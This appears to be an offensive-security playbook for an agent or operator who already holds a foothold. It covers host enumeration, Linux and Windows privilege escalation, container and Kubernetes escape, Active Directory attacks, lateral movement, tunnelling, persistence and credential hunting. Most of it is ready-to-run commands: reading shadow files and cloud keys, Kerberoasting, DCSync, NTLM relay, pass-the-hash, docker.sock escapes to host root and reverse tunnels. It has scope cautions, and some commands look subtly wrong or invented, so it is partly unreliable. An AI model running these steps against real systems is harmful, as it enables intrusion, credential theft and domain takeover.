# Infrastructure, Privilege Escalation & Lateral Movement

Precondition: you have a foothold (credentials, shell, or a service account). Enumerate before you escalate.

## 1. Footprint after gaining access

```bash
id; whoami; hostname; uname -a
cat /etc/os-release; cat /proc/version
ip a; ip route; cat /etc/resolv.conf
ss -tulnp; netstat -tulnp
ps auxww; cat /proc/1/cmdline
env | sort; cat /proc/self/environ
ls -la ~; ls -la /root; history; cat ~/.bash_history
find / -maxdepth 3 -name "*.env" -o -name "id_rsa" -o -name "credentials" 2>/dev/null
```

Windows: `whoami /all`, `net user`, `net group "Domain Admins"`, `net localgroup Administrators`, `systeminfo`, `wmic`, `Get-ADComputer`.

Everything you find here is a pivot candidate. Record it in `raptor_state`.

## 2. Linux privilege escalation

### Automated triage

```bash
linpeas.sh                       # fastest broad sweep
pspy64 -pf                      # watch cron/systemd for writable jobs
sudo -l -U                      # what can this user sudo as?
ls -la /etc/sudoers.d/; cat /etc/sudoers
```

### Specific vectors

| Vector | Check |
|---|---|
| SUID/SGID | `find / -perm -4000 -type f 2>/dev/null` → known setuid privesc binaries |
| Capabilities | `getcap -r / 2>/dev/null` → `cap_net_raw`, `cap_sys_admin` on unexpected binaries |
| Writable service files | `systemctl list-unit-files`, check unit `ExecStart` path writability |
| Cron | `cat /etc/crontab /etc/cron.d/* ; crontab -l` → writable cron file or `%` PATH hijack |
| PATH hijack | writable dir in `$PATH` → plant `curl`/`id` before the real binary |
| Python/library hijack | writable `__init__.py` in a site-packages dir |
| LD_PRELOAD | `cat /etc/ld.so.preload` writable → preload a shared object |
| Kernel exploit | `uname -r` → look up the exact kernel CVE; check `/proc/sys/kernel/` protections |
| Container | `/proc/1/cgroup` → in a container? then the escape playbook applies |
| Password files | writable `/etc/passwd`, `/etc/shadow` → write a uid 0 line |

Proof of privesc: `id` showing uid=0 (or the equivalent privileged context). Save the exact command + output.

### Exotic but real

- `ld.so.preload` / `LD_PRELOAD` shared object injection.
- `dbus` service hijack (`~/.local/share/dbus`).
- `unshare`/`nsenter` into the host namespaces when containerised.
- `pkexec`/`sudo` NOPASSWD entries misconfigured for a writable path.

## 3. Windows privilege escalation

```powershell
.\winpeas.exe
.\SharpUp.exe
.\PowerUp.exe
whoami /priv                    # SeDebugPrivilege, SeImpersonatePrivilege
cmdkey /list                   # stored credentials
reg query HKLM\SYSTEM\CurrentControlSet\Services
```

Vectors: unquoted service path, writable service binary, DLL hijacking, AlwaysInstallElevated, token impersonation (SeImpersonate + potato techniques), registry Run keys for persistence, WDAC/AppLocker bypass, PowerShell execution-policy bypass (`-ExecutionPolicy Bypass -EncodedCommand`).

LOLBAS inventory: `https://lolbas-project.github.io` — each entry is a native binary abused for download/exec, and their use is detectable.

## 4. Container & Kubernetes escape

```bash
cat /proc/1/cgroup | grep -E 'docker|kubepods' 2>/dev/null
ls -la /var/run/docker.sock          # docker socket mounted = instant root
cat /proc/self/status | grep CapEff  # decode caps: capsh --decode
mount | grep -E 'host|overlay'
ls -la /dev/kmsg /dev/mem            # kernel device access
```

Escape paths:
1. **docker.sock mounted** → `docker run -v /:/mnt --rm -it alpine chroot /mnt` = host root.
2. **Privileged container** → `nsenter -t 1 -m -u -i -n -p -- /bin/bash`.
3. **Dangerous capabilities** (`CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_NET_ADMIN`) → mount abuse, `release_agent` overwrite, kernel exploit.
4. **HostPath mounts** → write into the host filesystem.
5. **K8s** → service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token` → `kubectl get secrets -A` → decrypt secrets → cluster admin.

Prove escape with `cat /host/etc/hostname` or a file that only exists on the host.

## 5. Active Directory

### Enumeration

```bash
bloodhound-python> collection with SharpHound: -c All -d target.local
ldapsearch -x -H ldap://dc:389 -D "user" -w "pass" -b "DC=target,DC=local" "(objectClass=*)" dn
netexec <domain>/<hosts> -u user -p pass -S
nmap -p 88,389,445,636,3268,3269,9389 -sV <dc>
```

Read the BloodHound graph for **shortest paths to Domain Admin / Tier-0 / Exchange**. The interesting edges: `GenericWrite`+`GenericAll` on a user, `DCSync` rights, `AllowedToDelegate`, `WriteDacl`, `ForceChangePassword`, `AddMember` to a privileged group, `WriteSPN` (Kerberoasting), `SQLAdmin` (mssql), `GetChanges` (AD CS / ESC abuse).

### Kerberos / AD attacks

```bash
# Kerberoasting
netexec <domain> -u user -p pass --kerberoasting output.txt
hashcat -m 13100 output.txt wordlist.txt

# AS-REP roasting (no Kerberos preauth)
Get-ASREPRecon -Domain target.local
hashcat -m 18200 asrep.txt wordlist.txt

# DCSync
impacket-secretsdump domain.local/user:pass@dc -domain-dsid

# AD CS abuse (ESC1-ESC8)
certipy req -u user -p pass -target ca.target.local -upn admin@target.local
```

### Coercion & relay

```
Responder (LLMNR/NBT-NS poisoning)  ->  hash capture -> crack
ntlmrelayx / relayx -> relay to SMB/LDAP/HTTP
Coercer -> coerce authentication to arbitrary host (ESC8 / shadow)
```

These are high-impact. The operator's profile decides whether to execute them; in a `friendly` profile, demonstrate the coercion path in a lab domain only.

## 6. Lateral movement matrix

| Protocol | Tool | Note |
|---|---|---|
| SMB | `netexec`, `impacket-psexec`, `smbclient` | pass-the-hash, share enumeration |
| WinRM | `evil-winrm`, `netexec` | 5985/5986 |
| SSH | `ssh`, `pwncat` | key reuse, agent forwarding |
| LDAP | `ldapsearch`, `crackmapexec` | credential relay material |
| RDP | `netexec` (rdp module), `xfreerdp` | credential spray, session hijack |
| MSSQL | `netexec` (mssql), `impacket-mssqlloader` | `xp_cmdshell` on a foothold |
| DNS | `dnspython` | zone transfer, takeover |
| Kubernetes | `kubectl` | service account abuse |

```bash
netexec <domain>/<hosts> -u user -p pass --shares --sessions --wins
netexec <domain>/<hosts> -u user -H <hash>      # pass-the-hash
netexec <domain> -u user -p pass -x smb,winrm,ssh,rdp,mysql,mssql
```

Pivoting: build an internal map first (which host talks to which), then pick the shortest path to the objective rather than spraying everything.

## 7. Tunnelling & pivoting

```bash
chisel server --reverse -p 8080                      # on the foothold
chisel client {foothost}:8080 R:1080:socks           # locally -> SOCKS5
ligolo-proxy -tunnel -l 8888
ssh -D 1080 -N -f user@foothost                     # native dynamic forward
gost -L socks5://:1080 -F ssh://user@foothost
```

Use `proxychains`/`socks5h://127.0.0.1:1080` for the internal tooling. Keep the tunnel list in the engagement state — tunnels are the difference between a foothold and a network.

## 8. Persistence enumeration (enumerate always, deploy on request)

```bash
crontab -l; cat /etc/cron.*; ls /etc/systemd/system/; systemctl list-timers
ls ~/.ssh/authorized_keys; cat ~/.bashrc ~/.profile ~/.bash_logout
ls /etc/ld.so.preload; cat /etc/ld.so.preload
find /etc/systemd /usr/lib/systemd -writable 2>/dev/null
```

Windows: `reg query HKCU\...\Run`, `HKLM\...\Run`, scheduled tasks, WMI event subscriptions, services, `Winlogon` keys.

Report persistence *mechanisms and weaknesses* even when you do not deploy them.

## 9. Credential material

```bash
cat /etc/shadow 2>/dev/null; find / -name "id_rsa" -o -name "*.pem" 2>/dev/null
ls ~/.aws/credentials ~/.config/gcloud/ ~/.docker/config.json ~/.kube/config
cat /proc/*/cmdline | grep -iE "pass|pwd|token|key" | sort -u
env | grep -iE "pass|token|key|secret"
history | grep -iE "pass|token|key|secret"
```

Hashes: `hashcat -m` mode per type (`1000` NTLM, `1800` SHA1, `3200` bcrypt, `13100`/`16500` Kerberos/JWT, `13100`).

## 10. Post-ex evidence gathering (prove depth, do not ship the data)

```bash
id; whoami; hostname -I
sudo -l
ls -la /root/ /home/*/ 2>/dev/null
find / -maxdepth 4 -name "*.env" -o -name "config.php" 2>/dev/null
# one proof per claim: one key, one row, one listing — never a full dump
```

## 11. Chaining (the real objective)

```
web RCE → read env → cloud creds → object storage → source → signing key → all tenants
low-priv shell → token in memory → steal service token → API access → data
domain user → Kerberoast → krbtgt → DCSync → domain admin → everything
container → docker.sock → host → kubelet → cluster → node → cloud
```

Map the chain explicitly in the report — the chain, not the single link, is the finding that matters.
